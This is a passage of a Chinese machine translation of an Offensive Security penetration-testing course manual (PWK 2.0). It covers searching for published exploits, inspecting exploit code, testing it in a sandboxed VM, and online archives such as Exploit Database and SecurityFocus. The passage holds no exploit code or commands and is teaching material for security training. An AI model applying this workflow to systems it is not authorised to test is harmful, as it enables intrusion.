<div style="position:absolute;top:140116;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">鉴于这种危险，我们将依赖本模块中更值得信赖的漏洞利用库。</font></font></nobr></div>
<div style="position:absolute;top:140149;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">本模块提到的在线资源在托管之前分析提交的漏洞利用代码</font></font></nobr></div>
<div style="position:absolute;top:140168;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">它在线。</font><font style="vertical-align: inherit;">然而，即使在使用这些受信任的资源时，正确阅读也很重要</font></font></nobr></div>
<div style="position:absolute;top:140187;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">并大致了解它在执行时会做什么。</font><font style="vertical-align: inherit;">就算不考虑自己</font></font></nobr></div>
<div style="position:absolute;top:140207;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">程序员，这是提高代码阅读技能的好方法，甚至可以为您节省一些</font></font></nobr></div>
<div style="position:absolute;top:140226;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">尴尬的一天。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:140359;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="119"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 119 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:140392;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:141469;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:141469;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:141469;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">439</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:140488;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用低级编程语言编写并需要编译的漏洞利用通常是</font></font></nobr></div>
<div style="position:absolute;top:140507;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以源代码和二进制格式托管。</font><font style="vertical-align: inherit;">源代码更容易检查，但可能</font></font></nobr></div>
<div style="position:absolute;top:140526;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">编译麻烦。</font><font style="vertical-align: inherit;">二进制文件更难检查（没有专业技能和工具）</font></font></nobr></div>
<div style="position:absolute;top:140546;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">并且运行起来更简单。</font></font></nobr></div>
<div style="position:absolute;top:140579;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果代码检查或编译过于复杂，请设置一个带有干净快照的虚拟机作为</font></font></nobr></div>
<div style="position:absolute;top:140598;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">漏洞利用测试场或“沙箱”。</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:140635;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">14.2 搜索漏洞利用</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:140677;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在渗透测试的信息收集和枚举阶段之后，我们可以交叉检查</font></font></nobr></div>
<div style="position:absolute;top:140696;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">发现已知漏洞的软件，试图找到已发布的漏洞利用</font></font></nobr></div>
<div style="position:absolute;top:140716;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">漏洞。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:140750;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">14.2.1</font></font></i></nobr></div>
<div style="position:absolute;top:140750;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在线漏洞利用资源</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:140788;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">各种在线资源托管漏洞利用代码并免费向公众提供。</font><font style="vertical-align: inherit;">在这</font></font></nobr></div>
<div style="position:absolute;top:140807;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">部分，我们将介绍三种最受欢迎​​的在线资源。</font><font style="vertical-align: inherit;">这些资源通常进行</font></font></nobr></div>
<div style="position:absolute;top:140827;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对提交的漏洞利用代码进行测试，并删除任何被视为虚假或恶意的代码。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:140861;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">14.2.1.1 漏洞利用数据库</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:140896;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Exploit Database </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">363</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是一个由 Offensive Security 维护的项目。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">364</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是一个免费的公共档案</font></font></nobr></div>
<div style="position:absolute;top:140915;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过提交、邮件列表和公共资源收集的漏洞利用。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:141284;left:332"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 255：漏洞利用数据库主页</font></font></i></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:141399;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">363 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（进攻性安全，2019 年），https://www.exploit-db.com</font></font></font></nobr></div>
<div style="position:absolute;top:141419;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">364 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（进攻性安全，2019 年），https://www.offensive-security.com</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:141547;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="120"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 120 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:141580;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:142657;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:142657;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:142657;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">440</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:141670;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">14.2.1.1.1</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:141691;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">与其他在线资源相比，Exploit Database 偶尔会提供以下安装程序：</font></font></nobr></div>
<div style="position:absolute;top:141710;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用于研究目的的软件易受攻击版本。</font><font style="vertical-align: inherit;">当安装程序可用时，它是</font></font></nobr></div>
<div style="position:absolute;top:141729;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以网站上的图标标记，如 A 中显示的下载框图标所示</font></font></nobr></div>
<div style="position:absolute;top:141749;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 255 中的列。</font></font></nobr></div>
<div style="position:absolute;top:141782;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">漏洞利用数据库更新通过 Twitter 订阅源</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">365 发布</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，RSS 订阅源</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">366</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">也在</font></font></nobr></div>
<div style="position:absolute;top:141801;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可用的。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:141835;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">14.2.1.2 SecurityFocus 漏洞利用档案</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:141870;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SecurityFocus Exploit Archives </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">367</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">网站创建于 1999 年，专注于几个关键领域</font></font></nobr></div>
<div style="position:absolute;top:141889;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对安全社区很重要：</font></font></nobr></div>
<div style="position:absolute;top:141922;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">•</font></font></nobr></div>
<div style="position:absolute;top:141922;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">BugTraq：一个完整​​的公开邮件列表，目的是讨论和宣布</font></font></nobr></div>
<div style="position:absolute;top:141941;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">安全漏洞。</font></font></nobr></div>
<div style="position:absolute;top:141970;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">•</font></font></nobr></div>
<div style="position:absolute;top:141970;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SecurityFocus 漏洞数据库：提供有关漏洞的最新信息</font></font></nobr></div>
<div style="position:absolute;top:141989;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">适用于所有平台和服务。</font></font></nobr></div>
<div style="position:absolute;top:142017;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">•</font></font></nobr></div>
<div style="position:absolute;top:142017;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SecurityFocus 邮件列表：基于主题的邮件列表允许研究人员围绕</font></font></nobr></div>
<div style="position:absolute;top:142037;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">世界讨论各种安全问题。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:142567;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">365 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（推特，2019 年），https://twitter.com/exploitdb</font></font></font></nobr></div>
<div style="position:absolute;top:142587;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">366 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（进攻性安全，2019 年），https://www.exploit-db.com/rss.xml</font></font></font></nobr></div>
<div style="position:absolute;top:142607;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">367 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（SecurityFocus，2019 年），https://www.securityfocus.com</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:142735;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="121"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 121 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:142768;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:143845;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:143845;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:143845;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">441</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:143321;left:352"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 256：SecurityFocus 主页</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:143352;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SecurityFocus 通过他们的 Twitter 提要</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">368</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">宣布更新，</font><font style="vertical-align: inherit;">RSS 提要</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">369</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可作为</font></font></nobr></div>
<div style="position:absolute;top:143371;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">出色地。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:143775;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">368 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（推特，2019 年），https://twitter.com/securityfocus?lang=en</font></font></font></nobr></div>
<div style="position:absolute;top:143795;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">369 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（SecurityFocus，2019 年），https://www.securityfocus.com/rss/index.shtml</font></font></font></nobr></div>
</span></font>


<script>_addload(function(){_setupIW('com');_csi('en','zh-CN','o3cp%5B321-441%5D.pdf');});</script>
            <script>
              function gtElInit() {
                var lib = new google.translate.TranslateService();
                lib.setCheckVisibility(false);
                lib.translatePage('en', 'zh-CN', function (progress, done, error) {
                  if (progress == 100 || done || error) {
                    document.getElementById("gt-dt-spinner").style.display = "none";
                  }
                });
              }
            </script>
            <script src="./o3cp[321-441]_files/f.txt">
            </script><div id="goog-gt-tt" class="skiptranslate" dir="ltr"><div style="padding: 8px;"><div><div class="logo"><img src="./o3cp[321-441]_files/translate_24dp.png" width="20" height="20" alt="Google 翻译"></div></div></div><div class="top" style="padding: 8px; float: left; width: 100%;"><h1 class="title gray">原文</h1></div><div class="middle" style="padding: 8px;"><div class="original-text"></div></div><div class="bottom" style="padding: 8px;"><div class="activity-links"><span class="activity-link">提供更好的翻译建议</span><span class="activity-link"></span></div><div class="started-activity-container"><hr style="color: #CCC; background-color: #CCC; height: 1px; border: none;"><div class="activity-root"></div></div></div><div class="status-message" style="display: none;"></div></div>
          <div class="goog-te-spinner-pos"><div class="goog-te-spinner-animation"><svg xmlns="http://www.w3.org/2000/svg" class="goog-te-spinner" width="96px" height="96px" viewBox="0 0 66 66"><circle class="goog-te-spinner-path" fill="none" stroke-width="6" stroke-linecap="round" cx="33" cy="33" r="30"></circle></svg></div></div><span><div class="gmnoprint" style="display: none; z-index: 2147483647;"><img src="./o3cp[321-441]_files/iws_n.png" style="position: absolute; left: 0px; top: 0px; width: 628px; height: 8px; border: 0px; padding: 0px; margin: 0px;"><img src="./o3cp[321-441]_files/iws_n.png" style="position: absolute; left: 0px; top: 0px; width: 628px; height: 8px; border: 0px; padding: 0px; margin: 0px;"><img src="./o3cp[321-441]_files/iws_w.png" style="position: absolute; left: 0px; top: 0px; width: 8px; height: 598px; border: 0px; padding: 0px; margin: 0px;"><img src="./o3cp[321-441]_files/iws_e.png" style="position: absolute; left: 0px; top: 0px; width: 8px; height: 598px; border: 0px; padding: 0px; margin: 0px;"><img src="./o3cp[321-441]_files/iws_s.png" style="position: absolute; left: 0px; top: 0px; width: 628px; height: 8px; border: 0px; padding: 0px; margin: 0px;"><img src="./o3cp[321-441]_files/iws_s.png" style="position: absolute; left: 0px; top: 0px; width: 628px; height: 8px; border: 0px; padding: 0px; margin: 0px;"><img src="./o3cp[321-441]_files/iws_c.png" style="position: absolute; left: 0px; top: 0px; width: 628px; height: 598px; border: 0px; padding: 0px; margin: 0px;"><div class="SPRITE_iws_nw" style="overflow: hidden;"></div><div class="SPRITE_iws_ne" style="overflow: hidden;"></div><div class="SPRITE_iws_sw" style="overflow: hidden;"></div><div class="SPRITE_iws_se" style="overflow: hidden;"></div><div class="SPRITE_iws_tap" style="overflow: hidden;"></div><div class="SPRITE_iws_tap_l" style="overflow: hidden;"></div><div class="SPRITE_iws_tap_u" style="overflow: hidden;"></div><div class="SPRITE_iws_tap_ul" style="overflow: hidden;"></div><div class="SPRITE_iws_tap_rd" style="overflow: hidden;"></div><div class="SPRITE_iws_tap_ld" style="overflow: hidden;"></div><div class="SPRITE_iws_tab_dl" style="overflow: hidden; display: none;"></div><div class="SPRITE_iws_tab_dr" style="overflow: hidden; display: none;"></div><div class="SPRITE_iws_tab_l" style="overflow: hidden; display: none;"></div><div class="SPRITE_iws_tab_r" style="overflow: hidden; display: none;"></div></div></span><div id="google-infowindow" class="notranslate"><div class="gmnoprint" style="display: none; z-index: 2147483647;"><img src="./o3cp[321-441]_files/iw_n.png" style="position: absolute; left: 0px; top: 0px; width: 628px; height: 6px; border: 0px; padding: 0px; margin: 0px;"><img src="./o3cp[321-441]_files/iw_n.png" style="position: absolute; left: 0px; top: 0px; width: 628px; height: 6px; border: 0px; padding: 0px; margin: 0px;"><img src="./o3cp[321-441]_files/iw_w.png" style="position: absolute; left: 0px; top: 0px; width: 6px; height: 598px; border: 0px; padding: 0px; margin: 0px;"><img src="./o3cp[321-441]_files/iw_e.png" style="position: absolute; left: 0px; top: 0px; width: 6px; height: 598px; border: 0px; padding: 0px; margin: 0px;"><img src="./o3cp[321-441]_files/iw_s0.png" style="position: absolute; left: 0px; top: 0px; width: 628px; height: 6px; border: 0px; padding: 0px; margin: 0px;"><img src="./o3cp[321-441]_files/iw_s0.png" style="position: absolute; left: 0px; top: 0px; width: 628px; height: 6px; border: 0px; padding: 0px; margin: 0px;"><img src="./o3cp[321-441]_files/iw_c.png" style="position: absolute; left: 0px; top: 0px; width: 628px; height: 598px; border: 0px; padding: 0px; margin: 0px;"><div class="SPRITE_iw_nw" style="overflow: hidden;"></div><div class="SPRITE_iw_ne" style="overflow: hidden;"></div><div class="SPRITE_iw_xtap" style="overflow: hidden;"></div><div class="SPRITE_iw_xtap_l" style="overflow: hidden;"></div><div class="SPRITE_iw_xtap_u" style="overflow: hidden;"></div><div class="SPRITE_iw_xtap_ul" style="overflow: hidden;"></div><div class="SPRITE_iw_xtap_rd" style="overflow: hidden;"></div><div class="SPRITE_iw_xtap_ld" style="overflow: hidden;"></div><div class="SPRITE_iw_sw0" style="overflow: hidden;"></div><div class="SPRITE_iw_se0" style="overflow: hidden;"></div><div class="SPRITE_close" style="overflow: hidden; z-index: 10000; cursor: pointer; visibility: visible;"></div><div class="SPRITE_maximize" style="overflow: hidden; z-index: 10000; visibility: hidden; cursor: pointer; display: none;"></div><div class="SPRITE_restore" style="overflow: hidden; z-index: 10001; visibility: hidden; cursor: pointer; display: none;"></div></div></div><div style="display: none;"><iframe sandbox="" id="google-feedback-frame" name="FEEDBACK_TARGET_IFRAME_NAME" src="./o3cp[321-441]_files/saved_resource.html"></iframe></div></body></html>